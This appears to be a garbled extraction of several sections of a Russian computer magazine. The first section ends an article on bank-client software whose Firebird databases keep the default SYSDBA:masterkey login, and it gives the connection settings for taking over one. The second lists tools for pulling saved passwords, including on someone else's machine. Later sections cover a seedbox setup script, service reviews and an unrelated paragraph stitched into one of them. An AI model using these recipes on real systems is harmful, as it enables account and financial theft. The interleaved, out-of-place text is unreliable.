   Правда, в защиту этого клиен-
та стоит сказать, что в инструкции к
установке подробно расписывается,
каким образом можно сменить стан-              Внутреннее устройство базы
дартный пароль для пользователя              ДБО-клиента «ИК Банка»
SYSDBA.
4. УРАЛПРОМБАНК
Детище Уралпромбанка также базируется на использовании Firebird.
   Здесь тоже никто не позаботился о смене стандартного пароля или о
закрытии порта СУБД. Поэтому, используя все ту же магическую связку
SYSDBA:masterkey, можно подключиться к базе банк-клиента с любой маши-
ны из локальной сети. Для этого надо всего лишь в настройках подключения
выставить соответствующие параметры: версия сервера — Firebird 2.5, файл
базы данных — C:\UralProm3\db\BANK.FDB.


                                                             Банк-клиент
                                                           Уралпромбанка





                                       База данных банк-клиента Уралпромбанка


После чего база окажется под полным контролем.
5. ПРОЧЕЕ
В интернете можно найти и другие банки и ДБО, в инструк-
ции которых прямо прописана установка общеизвестных
паролей для доступа по сети к внутренней БД банк-клиента.
Примечательно, что большинство пользователей «толстых»                                               WARNING
банк-клиентов об этом могут и не догадываться. Банк пре-
доставил ПО, его установили по инструкции, а про то, что   Простые махинации с БД
можно влезть в БД по сети, никто и не знает. Так и продол-     могут оказаться цве-
                                                                           точками по сравнениюжают появляться подобные бреши в ИБ компаний. Что каса-                                                                            с тем, что через Firebird
ется ДБО с инструкциями по смене паролей по умолчанию,    можно выполнять ко-
то тут все зависит от пользователя. Хотя в идеале пользова-    манды операционной
                                                                        системы с правамитель ДБО должен сам проверять, что за СУБД используется                                                                    SYSTEM. Например,
банк-клиентом и какой там клиент, даже если в инструкции                                                                  можно добавить новую
об этом ничего не сказано. Но ведь так почти никто не дела-   учетную запись админи-
ет, большинство компаний не имеют отношения к IT вообще.    стратора всего сервера
                                                                      и залогиниться на него
                                                                          со всеми вытекающи-
ВЫВОДЫ                                                   ми последствиями. Вот
1. Все дополнительные средства безопасности ДБО, та-      теория и практика.
   кие как токены, цифровые подписи и подтверждение
   платежей по СМС, сводятся на нет при использовании
  СУБД с авторизацией по умолчанию, что чревато ощутимыми финансовыми
   потерями и компрометацией всего компьютера с критичной информацией.
2. Разработчики ПО любят переносить ответственность на потребителя,
   указывая, что тот должен самостоятельно прикрывать сторонние лазейки
   в БД. Хотя сами могли бы добавить своему ДБО безопасности, автомати-
   чески устанавливая сложный пароль при инсталляции банк-клиента. Ну или
   хотя бы сделать принудительным шагом смену пароля от БД при первом
   запуске клиент-банка. Использовать не привилегированную учетную за-
   пись для доступа к БД, а ограниченную, чтобы при компрометации учетки
  был невозможен захват всего сервера. Соблюдать и другие общепринятые
   стандарты безопасности работы с СУБД.
Дисклеймер

Приведенные материалы носят исключительно научно-исследовательский
характер. Исследование проводилось автором строго в научных целях, его
результаты не являются и не могут признаваться руководством к совершению
каких-либо противоправных действий. При проведении исследования автор
действовал в рамках законодательства Российской Федерации. Использо-
вание результатов исследования допускается исключительно в научно-по-
знавательных целях. Использование результатов исследования для достиже-
ния противоправного или любого иного отличного от научной деятельности
результата может повлечь за собой уголовную, административную и (или)
гражданско-правовую ответственность. Автор не несет ответственности за
инциденты в сфере информационной безопасности, имеющие отношение
к тематике исследования.
PC ZONE


                   ИЗВЛЕКАЕМ ПАРОЛИ
                  ИЗ ПОПУЛЯРНЫХ
                  ПРОГРАММБОРЬБА
СО СКЛЕРОЗОМ
Браузеры, почтовые клиенты и другие программы ча-
сто предлагают сохранять пароли. Это очень удобно:
сохранил и забыл, причем иногда в прямом смысле
слова. Но что если тебе нужно сменить браузер, пе-
реустановить систему или просто зайти с другого
компа? Оказывается, браузеры хранят пароли очень
ненадежно. Программ для восстановления — мас-
са, и конечно, на чужой машине они сработают ничуть
не хуже, чем на твоей.

БРАУЗЕРЫ
В браузере часто хранятся десятки, а то и сотни паролей. Понятное дело, если
ты не используешь один пароль на все случаи жизни (а это не лучшая идея), за-
помнить пароли от всех сайтов и форумов бывает проблематично.
   Если ты забыл важный пароль и не хочешь ломать себе голову, качай и ставь
программу WebBrowserPassView. Ты будешь удивлен: она с легкостью извлечет
пароли из Internet Explorer, Edge, Chrome, Opera, Safari, Firefox и Yandex Browser,
причем поддерживаются самые новые версии. Лично я тестировал эту програм-
му с IE, Firefox, Chrome и Opera — ни в одном случае не возникло осечек.
  Перед запуском WebBrowserPassView желательно отключить антивирус, по-
скольку некоторые будут жаловаться, что это малварь. Результат восстанов-
ления показан на скриншоте. Не обессудь, но колонку Password и часть User
Name я замазал.


                                                                      Результат
                                                                работы
                                                               WebBrowser
                                                                   PassView
Выдели пароли, которые хочешь запомнить, выполни команду File — Save
Selected Items. Выделенные пароли будут сохранены в обычный текстовый файл
такого формата:

==================================================
URL               : сайт
Web Browser       : Firefox 32+
User Name         : пользователь
Password          : пароль
Password Strength : Very Strong
User Name Field   :
Password Field    :
Created Time      : 09.07.2015 21:15:16
Modified Time      : 09.07.2015 21:15:16
==================================================

И конечно, программа годится для извлечения паролей на чужой машине. Если
у тебя есть локальный доступ или удаленный — через RDP или TeamViewer, то
заполучить пароли будет несложно.

ПОЧТОВИКИ
Аналогичные программы существуют и для восстановления паролей из почто-
вых клиентов. Одна из таких программ — Mail PassView. Она позволяет анали-
зировать длинный список почтовиков:
•  Outlook Express;
•  Microsoft Outlook 2000 (только учетные записи POP3 и SMTP);
•  Microsoft Outlook 2002–2016 (учетные записи POP3, IMAP, HTTP и SMTP);
•  Windows Mail;
•  IncrediMail;
•  Eudora;
•  Netscape 6.x/7.x;
•  Mozilla Thunderbird;
•  Group Mail Free;
•  Yahoo Mail — если пароль сохранен в приложении Yahoo Messenger;
•  Hotmail/MSN mail — если пароль сохранен в приложении MSN Messenger;
•  Gmail — если пароль сохранен в приложениях Gmail Notifier, Google Desktop
   или Google Talk.

Программа успешно восстановила мои пароли, сохраненные в Microsoft Outlook
2013 и Thunderbird.
                                                                             Mail PassView


Если ты используешь portable-версии Thunderbird, Netscape и Eudora, то можно
будет выбрать каталог с почтовиком.





     Выбор каталога для восстановления паролей из portable-версий почтовых клиентов


НЕ ЗАБЫВАЕМ О СТАРИКАХ
Mail PassView позволяет восстановить пароли из многих почтовых клиентов,
но не из The Bat. Однако пользователям The Bat рано радоваться (или огор-
чаться — в зависимости от ситуации). Ведь этот почтовик сам может сообщить
тебе сохраненный пароль!
   Для этого нужно в настройках почтового ящика включить лог, а затем про-
смотреть файл POP.log после проверки почты (точнее — после подключения
к POP-серверу). Как видишь, все предельно просто!





                                                            Включаем лог





                                Пароль передается в открытом виде командой PASS
Из другой популярной когда-то и встречаю-
щейся до сих пор программы — файлового
менеджера  Total Commander восстановить
пароли чуть сложнее. Но если тебе вдруг надо
выцарапать из него давно забытый пароль
к FTP, то попробуй утилиту Windows Commander
FTP crack.
   Использовать эту утилиту нужно так. Ищешь
WCX_FTP.INI, в нем хранятся зашифрованные
пароли к FTP. Скопируй зашифрованный па-
роль в программу и нажми кнопку Show.
   Кстати,  из  FileZilla  тоже можно  выта-
щить пароли — при помощи программы             Утилита Windows
BulletsPassView.                                      Commander FTP crack

ДРУГИЕ ТУЛЗЫ
Если рассмотренные программы по какой-то причине тебе не подойдут, то вот
более полный список софта для восстановления паролей.
•  Outlook Password Decryptor — позволяет восстановить пароли из Outlook,
   в том числе последней версии — Outlook 2016 для 10.
•  PstPassword — еще одна программа для восстановления паролей, сохра-
   ненных в Outlook.
•  Dialupass — восстанавливает пароли от dial-up, RAS и VPN. Поддерживает
   Windows всех версий, начиная с 2000 и заканчивая десяткой.

Кроме того, на сайте NirSoft ты найдешь много утилит для восстановления па-
ролей. Подробно мы их все рассматривать не будем, ограничимся выбороч-
ным списком.
•  MessenPass — восстанавливает пароли из мессенджеров, таких как Miranda,
   Yahoo Messenger, ICQ Lite, Windows Messenger и другие. На данный момент
   все эти мессенджеры устарели, но вдруг тебе понадобится вытащить па-
   роль от аськи со старого компа — MessenPass подойдет как нельзя лучше.
•  IE PassView — старый просмотрщик паролей для IE, поддерживает вер-
   сии до восьмой включительно, но лучше все же использовать WebBrowser
   PassView.
•  BulletsPassView — позволяет восстановить пароли, сохраненные в различ-
   ных приложениях для Windows, таких как CuteFTP, FileZilla, VNC.
•  Network Password Recovery — восстанавливает пароли к расшаренным
   по сети папкам. Есть поддержка Windows 8 и Windows 10.
•  PstPassword — позволяет восстановить пароль из файла PST. Работает
   с Outlook до версии 2007.
•  PasswordFox,  ChromePass,  OperaPassView —  восстанавливают  паро-
   ли, сохраненные в  Firefox, Chrome и Opera соответственно. Впрочем,
   WebBrowserPassView заменяет их все.
•  WirelessKeyView — пригодится, если ты забыл сохраненный пароль к Wi-Fi.
   Хотя в этом, как правило, нет смысла, поскольку Windows этот пароль не охра-
   няет, и ты в любой момент можешь просмотреть его, используя средства ОС.
•  Remote Desktop PassView — достает пароли из файлов RDP.

КАК БОРОТЬСЯ
Как видишь, многие программы предлагают сохранить пароли и почти никак
их не защищают. Одни хранят их прямо в открытом виде, другие используют
слишком слабое шифрование. Мне на моем компе удалось восстановить все
пароли из всех браузеров и всех почтовых клиентов.
   Что делать, если ты не хочешь, чтобы кто-то смог повторить это, добрав-
шись до твоей машины? Есть разные способы решения этой проблемы. Самый
лучший — никогда не сохранять пароли и не забывать пить таблетки для улуч-
шения памяти. Специальные менеджеры паролей с гораздо более серьезной
степенью защиты, чем у браузеров, — тоже неплохой выход. Ну а если все же
хочешь сохранять пароли в браузере и почтовике, можешь скачать портатив-
ные версии и держать их на зашифрованном диске.
PC ZONE
ВЕЧНЫЙ СИД
КАК РАЗДАВАТЬ И СКАЧИВАТЬ
ТОРРЕНТЫ БЕЗ СЛЕДОВ


                                                                                           84ckf1r3
                                                                                               84ckf1r3@gmail.com
Торренты и файлообменные сети пытаются
запретить с момента их создания. Десятки
трекеров уже закрылись, Rutracker.org ушел
в подполье, а топовые сиды давно на при-
                                               WARNINGцеле. Поэтому все большую популярность
                                                                      Вся информация предо-
набирают сидбоксы. Эти удаленные сер-           ставлена исключитель-
веры предлагают альтернативный способ          но в ознакомительных                                                                                  целях. Ни редакция,
                                                                       ни автор не несут ответ-приобщиться к миру торрентов. С ними
                                                                             ственности за любой
не остается явных следов и даже появляют-      возможный вред, при-
ся дополнительные бонусы.                              чиненный материалами                                                                           данной статьи.

Сам по себе протокол BitTorrent не обеспечивает анонимность, если только
не реализован через Tor, что тоже не панацея. Каждый участник файлообмена
видит айпишники других. Можно по ходу дела наблюдать, кто скачивает файлы
у тебя и от кого ты получаешь фрагменты определенного файла. Между тор-
рент-клиентом и торрент-трекером передается достаточно данных, чтобы спа-
лить как сидов, так и личеров. Большинство трекеров использует обычный HTTP
вместо HTTPS. Вдобавок шаблон сетевой активности абонента при использо-
вании им файлообменных сетей получается очень узнаваемым.
  В последнее время входящий торрент-трафик по своему усмотрению на-
чинают блокировать админы крупных фирм и отдельные провайдеры (особен-
но мобильные операторы), а исходящий автоматически определяется СОРМ
и делает абонента потенциально интересным для управле-
ния «К». Борьба правообладателей с торрентами продол-
жается, что находит отражение в готовящихся к принятию
федеральных законах и других нормативных актах. См. на-
пример, федеральный закон от 2 июля 2013 года № 187-ФЗ
и списки принятых позднее поправок к нему.                                                         INFO
   Понятно, куда катится этот растущий ком законодатель-
                                                                         Сидбокс повышаетных ограничений. Уже сейчас легко предугадать, кого он                                                                               степень приватно-
может накрыть вслед за владельцами торрент-трекеров:     сти, но не обеспечи-
сначала самых активных сидов, а затем и всех подряд, если     вает анонимность.
                                                                          Если хочешь по-на-первой публичной порки будет мало. Законы в этой сфере                                                                         стоящему скрыть
еще не проработаны, однако техническая часть — вполне.                                                                                следы, можешь
Тем не менее есть проверенный способ эффективно сиди-     обращаться к сид-
ровать, не особо светясь и аккуратно собирая улов из фай-      боксу через VPN.
лообменных сетей по другим каналам.
СИД В КОРОБКЕ
Seedbox — это удаленный сервер для беспроблемной загрузки и особенно
раздачи торрентов. Поскольку сидбокс должен обрабатывать большой трафик
и предоставлять инструменты для удаленного администрирования, делать его
проще всего на основе Linux и какого-то популярного торрент-клиента с под-
держкой нескольких интерфейсов. CLI (command line interface) обеспечивает
возможность порулить торрентами через SSH и радует знатоков командной
строки, но в последнее время становятся популярными и варианты попроще —
с VNC, веб-интерфейсом и даже Windows и RDP.
  Смысл сидбокса в том, что он берет на себя всю черную работу с торрен-
тами, делая ненужной файлообменную активность на домашнем или рабочем
компьютере. Все раздаваемые файлы загружаются на сидбокс лишь один раз,
а не генерируют исходящий трафик постоянно. Скачанные из торрентов файлы
остаются для раздачи на сидбоксе согласно настройкам и забираются с него
по FTP, SFTP, rsync и даже HTTP. То есть никакого BitTorrent на своей машине.
   Технически сидбоксом может быть хоть одноплатный микрокомпьютер,
но для обработки большого трафика он чаще поднимается как виртуальная ма-
шина в дата-центре. Как сервис сидбоксы стали массово появляться в 2009
году и долгое время были на полулегальном положении. Сейчас они продолжа-
ют балансировать на грани закона, но теперь есть географическое разделение.
В одних странах сидбоксы явно запрещены, а в других продвигаются открыто
наряду с другими популярными услугами — хостингом сайтов и арендой выде-
ленных серверов. По своей сути сидбоксы — те же выделенные серверы, только
настроенные исключительно для работы с торрентами. Они допускают опцио-
нальную реконфигурацию под свои нужды и доступны сразу после оплаты.
   Есть два принципиально разных типа сидбоксов: выделенные (dedicated)
и слоты с совместным доступом (shared slots). Независимо от реализации
на уровне железа выделенный сидбокс передается в аренду одному конкрет-
ному пользователю. Он сам определяет его настройки в пределах ограничений
тарифного плана и ни с кем не делит его ресурсы. Соответственно, расшарен-
ные слоты — это сидбоксы в совместном использовании. Общим у них может
быть либо только дисковый массив, либо все ресурсы (процессорное время,
оперативная память, канал). Изоляция каталогов загрузки разных пользовате-
лей происходит лишь программно, поэтому торренты разных пользователей
тормозят работу друг друга.
  Выделенные сидбоксы — быстрые и дорогие. Типичные скорости у них на-
чинаются от гигабита, объемы — от половины терабайта (часто — на SSD-
RAID) и цены от 40 долларов в месяц. У слотовых сидбоксов все показатели
скромнее: от пары гигабайтов на медленном диске с каналом 50–100 Мбит/с
до уровня младших выделенных. В последнее время их делают чисто для де-
монстрации услуги, хотя встречаются и приятные исключения. Если лень за-
морачиваться и поднимать собственный сидбокс, можно попробовать один
из готовых. По ссылке ты найдешь обновляемую таблицу для сравнения цен
на зарубежные сидбоксы.

СОЗДАЕМ СВОЙ СИДБОКС
Следует понимать, что, создавая «свой сидбокс», ты все равно сделаешь типо-
вую сборку, просто со своими особенностями. Возьмешь готовую операцион-
ку (к примеру, Debian), готовый торрент-клиент (например, rTorrent + ruTorrent),
готовые плагины к нему, настроишь это все готовыми скриптами с GitHub (или
вывихнешь пальцы, набирая тонну команд), а потом еще будешь искать подхо-
дящий хостинг. Заботиться о таком сидбоксе придется самому (читай — делать
дополнительную автоматизацию с проверками и рестартом). Мало какой хо-
стер отважится помогать с техподдержкой самодельных франкенштейнов, ему
проще сдавать в аренду свою армию клонов.
   Устройства для раздачи торрентов делают давно, но не все
их можно назвать полноценными сидбоксами. Те, кому нуж-
на была просто отдельная торрент-качалка, купили NAS
с поддержкой Transmission или просто подключили к роутеру
флешку или жесткий диск. Это компактные и энергоэффек-
тивные решения, у которых почти все работает из коробки.
                                                          INFOПродвинутые гики понаделали mini-ITX-серверов и добави-
ли к ним функции сидбоксов до кучи. Ленивые и богатые ку-     Некоторые трекеры
                                                                               ограничиваютпили фирменные мини-серверы (например, HP) и сделали                                                                                   количество IP-
примерно то же самое. Однако все это клевое железо стоит                                                                                 адресов, которые
у любителей торрентов в том же помещении, что и компью-     может использовать
тер, поэтому никакой анонимности не добавляет. Оно даже        один аккаунт.
не уменьшает нагрузку на локальную сеть, скорее наоборот.
   Какую-то приватность и высокую (до 20 Гбит/с) скорость могут дать толь-
ко зарубежные платформы для сидбоксов на площадках крупных дата-центров
с толстыми каналами. Существует обновляющийся список типовых сидбоксов,
протестированных одним торрент-фриком с Reddit. Обрати внимание на цены.
Что-то крутое стоит 120–200 долларов в месяц. Остальное обычно работает
через пень-колоду либо мало отличается от домашнего анлима на 100 Мбит/с
за восемь баксов в месяц (а если и отличается, то в худшую сторону, особен-
но по доступным объемам дискового пространства). Поэтому мы подробнее
рассмотрим менее затратный вариант: сконфигурируем сидбокс программно
и разместим его сами на каком-нибудь зарубежном сервере, хоть найти подхо-
дящий хостинг и непростая задача.
  В нашем примере будем использовать дистрибутив Ubuntu 14.04 LTS. На-
стройки при установке по большей части стандартные. Графическая обо-
лочка — опционально. Единственное обязательное условие — инсталляция
сервера SSH. В качестве веб-сервера проще всего использовать nginx. Его
установку выполним позже вместе с остальными компонентами. Среди них бу-
дет FTP-сервер (vsftpd), набор библиотек libtorrent, клиент rTorrent и веб-интер-
фейс для него — ruTorrent. Также установим IRC-клиент Irssi с плагином autodl-
irssi. Он будет мониторить IRC-каналы со свежими торрентами и скачивать те
из них, которые заданы фильтром.
   Автоматическая установка vsftps, rTorrent, ruTorrent, autodl-irssi, nginx и мно-
жества вспомогательных компонентов уже прописана в готовом скрипте. Он
выполняется на Debian 7/8 или Ubuntu начиная с версии 12.04. Его работа за-
нимает порядка десяти минут. Те же самые манипуляции вручную потребовали
бы как минимум пару часов.
  Первым делом скачиваем скрипт автоустановки и первичной настройки всех
компонентов сидбокса.

wget https://raw.githubusercontent.com/arakasi72/rtinst/
    master/rtinst.sh

Запускаем его с правами рута (в Debian команды sudo может не быть по умол-
чанию — лучше сразу установи одноименный пакет).

sudo sh rtinst.sh





                                                       Начало работы скрипта
Скрипт поначалу выполняется как интерактивный. Первый запрос — проверка
IP-адреса и имени сервера (сидбокса). Второй — задание пароля для ruTorrent.
Если его не ввести, то сгенерируется случайный пароль, который отобразит-
ся в конце установки. После этого шага все остальные операции выполняются
в тихом (unattended) режиме.





                                                     Переход к тихой установке
На экране поочередно появляются сообщения о выполнении обновления па-
кетов, скачивании и установке библиотек, а также всех перечисленных ранее
компонентов.





                                      Установка vsftpd, libtorrent, rTorrent и ruTorrent

Если скрипт находит установленный сервер Apache, то не ставит nginx. Все
заданные по умолчанию настройки сохраняются в файле /home/$username/
rtinst.info.
                                                           Добавление
                                                             заданий
                                                            для планировщика
                                                          и завершение
                                                            работы скрипта


Если выполнение скрипта по какой-то причине прервалось, его можно запу-
стить заново.
   После его выполнения сидбокс почти готов. Останутся мелкие опциональ-
ные штрихи. При желании добавляем новых пользователей:

sudo adduser --gecos “” $newuser

Опционально даем им доступ по SSH:

sudo adduser $newuser sshuser

Затем создаем каталоги для rTorrent с подкаталогами для загрузок, текущей
сессии и мониторинга новых торрентов:

sudo mkdir /home/$newuser/rtorrent
sudo mkdir /home/$newuser/rtorrent/downloads
sudo mkdir /home/$newuser/rtorrent/.session
sudo mkdir /home/$newuser/rtorrent/watch
После этого настраиваем клиент, редактируя файл .rtorrent.rc. Пропишем
в нем порт 5555 для SCGI (протокола взаимодействия приложений с веб-сер-
верами) и диапазон портов для rTorrent в текущей учетной записи. Можно сде-
лать несколько пользователей и назначить каждому свои диапазоны:

port_range = 51001-51500
network.scgi.open_port = 127.0.0.1:5555

Завершаем дополнительную настройку rTorrent:

sudo perl -pi -e “s/<user name>/$newuser/g” /home/$newuser/.rtorrent.rc

Переходим к настройке ruTorrent. Создаем каталоги:

sudo mkdir /var/www/rutorrent/conf/users/$newuser
sudo mkdir /var/www/rutorrent/conf/users/$newuser/plugins

Редактируем файл конфигурации:

sudo nano /var/www/rutorrent/conf/users/$newuser/config.php

Указываем в нем каталог текущего пользователя, тот же порт для SCGI, какой
мы задали при настройке rTorrent (5555), и уникальную точку монтирования
(здесь это RPC3).





Если делали аккаунт для нового пользователя, то добавляем его в htpasswd:

sudo htpasswd /etc/nginx/.htpasswd $newuser

Создаем каталоги для autodl-irssi, скачиваем и распаковываем готовые скрип-
ты и прописываем плагин на автозапуск.

sudo mkdir /var/www/rutorrent/conf/users/$newuser/plugins/autodl-irssi
sudo mkdir -p /home/$newuser/.irssi/scripts/autorun
cd /home/$newuser/.irssi/scripts
sudo wget --no-check-certificate -O autodl-irssi.zip
    http://update.autodl-community.com/autodl-irssi-community.zip
sudo unzip -o autodl-irssi.zip
sudo rm autodl-irssi.zip
sudo cp autodl-irssi.pl autorun/
sudo mkdir -p /home/$newuser/.autodl
sudo touch /home/$newuser/.autodl/autodl.cfg
sudo touch /home/$newuser/.autodl/autodl2.cfg

Переходим к настройке autodl-irssi. В файле autodl2.cfg пишем следующее:

[options]
gui-server-port = 36760
gui-server-password = [password]

Тот же самый номер порта и пароль прописываем в conf.php.





Здесь пароль записывается в кавычках. После настройки раздаем пользовате-
лям права доступа.

sudo chown -R $newuser:$newuser /home/$newuser
sudo chown -R www-data:www-data /var/www/rutorrent/conf/users/$newuser
sudo chmod -R 755 /var/www/rutorrent/conf/users/$newuser

В заключение вешаем rTorrent и irssi в планировщик задач cron, чтобы они запу-
скались автоматически также и при входе нового пользователя.

sudo crontab -u $newuser -e
// Добавить строки
@reboot sleep 10; /usr/local/bin/rtcheck irssi rtorrent
*/10 * * * * /usr/local/bin/rtcheck irssi rtorrent

Теперь для удаленного доступа к торрент-клиенту на нашем (или, хе-хе, чужом)
сидбоксе логинимся по адресу https://IP_сидбокса/rutorrent.
                                                 Удаленный доступ к сидбоксу


Если все было сделано правильно, то мы сразу увидим окно ruTorrent. Оформ-
ление практически идентично µTorrent и другим популярным торрент-клиентам.





                                                        Главное окно ruTorrent
При желании настраиваем autodl-irssi. Помогут в этом списки каналов популяр-
ных торрент-трекеров.


                                                             Выбираем
                                                                каналы
                                                                      трекеров





Можно пропустить этот шаг и сразу перейти к скачиванию торрентов вручную.
Для этого можно ввести ссылку на файл .torrent или загрузить его как локаль-
ный файл.


                                                                Добавляем
                                                                    торренты
После успешного добавления каждого торрента появляется всплывающее со-
общение.


                                                                     Торрент
                                                                   добавлен
                                                                     в очередь
                                                                             rTorrent





Очередью можно управлять точно так же, как ты привык это делать в локальном
торрент-клиенте.


                                                                     Управ-
                                                                  ление
                                                                 очередью
                                                                       торрентов





Созданный сидбокс можно крутить на любом компе, но лучше разместить его
у зарубежного провайдера. При выборе площадки для размещения сидбокса
обрати внимание на реально доступную «толщину» канала. Многие гордо ука-
зывают общую (которая потом делится на тысячи абонентов) или отдельно ого-
варивают ограничения для торрентов. Например, режут скорость после аплоа-
да пары терабайтов. Железо тоже имеет не последнее значение. Чем большее
число активных торрентов планируется, тем больше оперативки и процессорных
ядер им потребуется. Многоядерные Xeon — хорошо, но часто их использование
обходится слишком дорого. Для сидбокса вполне хватает пары современных
Intel Atom. Вот как выглядит их свежее сравнение на практике (взято с Reddit).


  ONLINE.NET
    Тип процессора: Intel(R) Atom(TM) CPU C2750 @ 2.40 GHz
   Число ядер: 8
    Частота процессора: 1200.000 MHz
   Общий объем ОЗУ: 7971 MB
                                   WWW   Общий объёма свопа: 975 MB
   Время работы: 8 days, 7:55
                                                                        Альтернативный скрипт    Скорость скачивания с CacheFly: 96.3 MB/s
                                                                            для превращения    Скорость дисковых операций: 70.7 MB/s
                                                                            чистой Debian/Ubuntu
                                                                               в навороченный
                                                                            Seedbox
  FERALHOSTING                                                                   FAQ по скрипту
    Тип процессора: E5-2680 v3 @ 2.50 GHz                                                                              для создания
   Число ядер: 48                                                                              сидбоксов
    Частота процессора: 2500.102 MHz
   Общий объем ОЗУ: 257846 MB
    Скорость скачивания с CacheFly: 162 MB/s
    Скорость дисковых операций: 167 MB/s


При колоссальной разнице в уровне платформы скорость второй лишь в 1,7
раза больше.
  Многие хостеры предлагают готовые сидбоксы, но не стремись сэкономить,
заключая договор длительной аренды. Такие фирмы редко работают долго, да
и сама услуга в любой момент может быть объявлена вне закона.
   Основное преимущество сидбокса состоит в том, что он работает с торрен-
тами гораздо эффективнее домашней машины. Он не выполняет других задач,
активен круглосуточно и отдает трафик на высокой скорости. Поэтому его по-
бочный эффект — быстрое повышение статуса пользователя на торрент-тре-
керах с рейтинговой системой. Также он может стримить видео или просто
служить единой медиатекой для всех устройств. При использовании сидбокса
вся файлообменная активность не связана с твоим IP-адресом, а выполняется
от имени удаленного узла в Гондурасе (ну или где ты его сам разместил).
PC ZONE





                                          Андрей Письменный
                                                    apismenny@gmail.com



       WIGLE — ПУБЛИЧНАЯ БАЗА ДАННЫХ ХОТСПО-
       ТОВ И СОТОВЫХ ВЫШЕК
               wigle.net
 1





                            Если ты собираешься заняться вардрайвингом или просто поче-
          му-то интересуешься, какие по соседству с твоим домом есть точки
          доступа, ты просто обязан знать про сайт wigle.net. Это публично до-
          ступная база данных хотспотов, которую энтузиасты собирают уже
         много лет. Возможно, ходить с антенной по улицам не придется —
         ведь все уже сделано за тебя.
            Сайт Sci-Hub позволяет скачать практически любую научную рабо-
             ту. Всё, что для этого нужно — ввести в поисковую строку ее иден-
тификатор, ссылку на сайт, где она размещена (к примеру, ACM) или
просто ключевые слова. Нажимаешь open, и готово — можно смотреть
PDF в браузере или скачать для дальнейшего вдумчивого чтения.
   Пользоваться WiGLE предельно просто: заходишь на сайт и либо
сразу смотришь карту (увы, загрузка слоя с хотспотами далеко не
моментальная), либо ищешь местоположение нужной точки досту-
па по SSID или MAC-адресу. Обрати внимание — для поиска есть
специальная страница (View — Search), не пытайся в тех же целях
использовать фильтр карты.





Искать можно не только по целому SSID, но и по его части, к тому же ре-
зультаты поиска можно ограничить по геолокации и задать другие па-
раметры — к примеру, силу сигнала. Результатом поиска будет таблица
с описаниями сетей, включая метод шифрования. Не забывай смотреть
и на дату, когда та или иная сеть была занесена в базу последний раз.
   У WiGLE есть открытый API, правда для его использования пона-
добится регистрироваться. А если ты хочешь помочь собирать базу
данных, то можешь установить на телефон или компьютер одно из
приложений, которые отдают данные в подходящем формате.
  Помимо WiGLE, существуют и приватные базы данных хотспо-
тов. Наиболее известные принадлежат Google и компании Skyhook
Wireless. Доступ к ним тоже можно получить, но понадобится реги-
стрировать аккаунт разработчика, описывать, в каких целях пред-
полагается использовать API, а в случае интенсивного использова-
ния — платить. И по вполне понятным причинам никто не позаботился
о том, чтобы сделать такой же удобный фронтенд, как у WiGLE.
     BLANKSTAMP — АНОНИМНЫЙ ПОЧТОВЫЙ СЕРВИС
           BlankStamp.io

2





                        Всем известно, что для анонимной отправки электронного пись-
       ма нужно завести фейковый адрес. Если дело не ограничится одним
        посланием, то этой дополнительной учеткой придется на протяжении
        всей переписки пользоваться. Разработчики сервиса BlankStamp
       придумали способ, который избавляет от этой необходимости.
          Чтобы отправить анонимное письмо через BlankStamp.io, доста-
        точно зайти на сайт, вписать email адресата в форму в самом низу и
        нажать на кнопку Go. По ней откроется стандартный системный по-
         чтовик, где в поле адреса доставки будет написано что-нибудь вроде
       person_at007_server.com@blankstamp.io, где person и server.
       com — две части изначального адреса получателя.
          Адресат же, открыв послание, увидит, что оно отправлено с адре-
        са на blankstamp.io, но вместо имени пользователя будет длинный
       набор чисел. Самое интересное — что на такое письмо можно от-
        ветить и переписываться дальше совершенно обычным способом,
        просто вся переписка будет проходить через BlankStamp, а адреса
        будут подменяться.
          Бесплатно разрешается переписываться не более чем с пятью
       адресатами в неделю. Если нужно больше, то предлагается при-
       обрести «кредиты Incognito» и тратить их. 2500 сообщений в таком
        случае обойдутся в 5 долларов.
          Создатели BlankStamp отлично понимают, что их сервис спосо-
       бен привлечь спамеров, так что предупреждают: если активность
        клиента им не понравится, то ему откажут в обслуживании. Адре-
        саты тоже могут отказаться получать письма, отправленные через
        BlankStamp: сообщение о такой возможности автоматически допи-
        сывается в каждое отправленное письмо. И конечно, разработчики
        клятвенно заверяют, что не хранят письма у себя.





      CANVAS — МНОГОПОЛЬЗОВАТЕЛЬСКИЙ ТЕКСТОВЫЙ
      РЕДАКТОР С ПОДДЕРЖКОЙ MARKDOWN
          Usecanvas.com
3





                        Когда в Google Docs добавили функцию совместной работы, это
        выглядело почти как магия: в документе появляется второй курсор
        и двое работают над текстом одновременно. Если ты не поклонник
        продуктов Google или предпочитаешь разметку Markdown традици-
       онным форматам офисных документов, то сервис под названием
        Canvas может тебе понравиться больше.
           Как и Google Docs, он поддерживает одновременную работу над
        документом несколькими людьми, и точно так же по ходу редактиро-
        вания можно переписываться во встроенном чате. Однако в Canvas
        ты не увидишь ни громоздкой панели инструментов, ни (раздража-
ющего, если печатать ты не собираешься) разделения на страницы,
ни вообще каких-либо меню или панелей.
   Зато Canvas поддерживает формат Markdown — простейшую
разметку, элементы которой удобно вводить с клавиатуры. К приме-
ру, чтобы создать заголовок, достаточно поставить в начале строки
символ решетки, а чтобы выделить слово курсивом, нужно обернуть
его в знаки подчеркивания. Canvas на лету подхватит эту разметку и
сделает заголовок крупным, сменит начертание на курсивное, соз-
даст работающую гиперссылку и так далее. Добавлена и пара своих
элементов, которых нет в стандартном Markdown, — в первую оче-
редь списки с возможностью ставить галочки напротив строк.
   К сожалению, минимализм Canvas — это не только плюс, но и ми-
нус. В этом сервисе нет и полезных вещей — к примеру, проверки
орфографии или контроля версий (и то и другое есть в Google Docs).
О таких мелочах, как счетчик знаков, и говорить не приходится. Еще
не помешала бы возможность сохранить или отправить по почте до-
кумент в виде файла — пока что в случае необходимости приходится
копировать текст с разметкой Markdown из браузера.
   Конечно, сервис пока слишком новый, чтобы требовать от него
всего сразу. Но для того, чтобы собраться с коллегами и быстро по-
смотреть какой-то текст, он уже вполне сгодится.
PC ZONE
КРИПТОГРАФИЧЕСКАЯ





                                                                             Олег Парамонов
                                                                                        paramonov@sheep.ruНАРОДНАЯ
РЕСПУБЛИКА
КАК BLOCKCHAIN ПОБЕДИТ БЮРОКРАТИЮ
(ИЛИ НЕТ)
Технология, которая лежит в основе Bitcoin, подхо-
дит не только для финансовых операций. Покончив
с автоматизацией экономики, ее апологеты мечта-
ют децентрализовать бизнес, коммунальные услу-
ги, регулирующие органы и даже само государство.
Но для этого нужно преодолеть множество техниче-
ских и политических проблем.

